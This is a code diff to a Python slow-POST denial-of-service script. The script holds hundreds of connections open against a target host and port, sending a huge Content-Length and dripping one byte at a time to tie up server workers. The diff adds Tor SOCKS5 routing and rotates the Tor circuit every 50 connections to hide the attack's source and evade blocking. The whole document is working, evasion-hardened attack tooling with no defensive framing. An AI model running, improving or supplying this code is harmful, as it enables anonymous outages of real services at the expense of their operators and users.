@@ -18,6 +18,12 @@ Usage:
 import socket, select, threading, time, argparse
 from datetime import datetime
 
+try:
+    import socks as pysocks
+    PYSOCKS_OK = True
+except ImportError:
+    PYSOCKS_OK = False
+
 G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
 C = "\033[0;36m"; B = "\033[1m"; W = "\033[0m"
 
@@ -67,16 +73,48 @@ def _is_dead(s):
         return True
 
 
-def open_slowloris_socket(target, port):
+_tor_ctrl  = None
+_tor_lock  = threading.Lock()
+NEWNYM_EVERY = 50   # rotate Tor circuit after every N new connections
+
+
+def _init_tor():
+    global _tor_ctrl
+    try:
+        from stem.control import Controller
+        _tor_ctrl = Controller.from_port(address="127.0.0.1", port=9051)
+        _tor_ctrl.authenticate()
+        print(f"  {G}[TOR]{W} ControlPort connected — NEWNYM every {NEWNYM_EVERY} connections")
+    except Exception as e:
+        print(f"  {Y}[TOR]{W} ControlPort unavailable ({e}) — circuit rotation disabled")
+
+
+def _newnym():
+    if _tor_ctrl:
+        try:
+            from stem import Signal
+            _tor_ctrl.signal(Signal.NEWNYM)
+            time.sleep(0.6)
+        except Exception:
+            pass
+
+
+def open_slowloris_socket(target, port, use_tor=False):
     """
-    Connect, send complete headers with Content-Length: 999999999,
-    then drip 1 byte every DRIP_INTERVAL seconds in a background thread.
+    Connect (via Tor SOCKS5 if use_tor), send complete headers with
+    Content-Length: 999999999, then drip 1 byte every DRIP_INTERVAL seconds.
     Server allocates body buffer and pins a worker waiting for the rest.
     Returns socket or None.
     """
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
+        if use_tor:
+            if not PYSOCKS_OK:
+                raise RuntimeError("PySocks not installed — pip3 install pysocks")
+            s = pysocks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+            s.set_proxy(pysocks.SOCKS5, "127.0.0.1", 9050)
+        else:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(10)
         s.connect((target, port))
         s.settimeout(None)
         s.send(COMPLETE_HEADERS)
@@ -102,9 +140,14 @@ def main():
     p.add_argument("--port",           type=int, default=8080)
     p.add_argument("--connections",    type=int, default=300)
     p.add_argument("--check-interval", type=float, default=6.0)
+    p.add_argument("--tor",            action="store_true",
+                   help="Route connections through Tor SOCKS5 (127.0.0.1:9050)")
     args = p.parse_args()
 
-    socks = []
+    if args.tor:
+        _init_tor()
+
+    pool  = []
     lock  = threading.Lock()
     stop  = threading.Event()
 
@@ -114,36 +157,40 @@ def main():
 {B}{'='*62}{W}
   Target      : {args.target}:{args.port}
   Connections : {args.connections} (slow POST body, auto-refill dead)
+  Proxy       : {"Tor SOCKS5 127.0.0.1:9050 — NEWNYM every "+str(NEWNYM_EVERY)+" conns" if args.tor else "direct"}
   Proof       : probe_8080 + probe_80 fresh-connect each cycle
 {B}{'='*62}{W}
 """)
 
     def fill_pool():
+        opened_total = 0
         while not stop.is_set():
             with lock:
-                dead = [s for s in socks if _is_dead(s)]
+                dead = [s for s in pool if _is_dead(s)]
                 for s in dead:
-                    socks.remove(s)
+                    pool.remove(s)
                     try: s.close()
                     except: pass
-                needed = args.connections - len(socks)
+                needed = args.connections - len(pool)
 
-            opened = 0
             for _ in range(needed):
                 if stop.is_set():
                     break
-                s = open_slowloris_socket(args.target, args.port)
+                if args.tor and opened_total % NEWNYM_EVERY == 0 and opened_total > 0:
+                    with _tor_lock:
+                        _newnym()
+                s = open_slowloris_socket(args.target, args.port, use_tor=args.tor)
                 if s:
                     with lock:
-                        socks.append(s)
-                    opened += 1
+                        pool.append(s)
+                    opened_total += 1
             time.sleep(1)
 
     def status_loop():
         while not stop.is_set():
             time.sleep(args.check_interval)
             with lock:
-                held = len(socks)
+                held = len(pool)
 
             ts = datetime.now().strftime("%H:%M:%S")
 
@@ -165,7 +212,7 @@ def main():
         print(f"\n  {Y}[STOPPED]{W} Ctrl+C\n")
         stop.set()
         with lock:
-            for s in socks:
+            for s in pool:
                 try: s.close()
                 except: pass
 
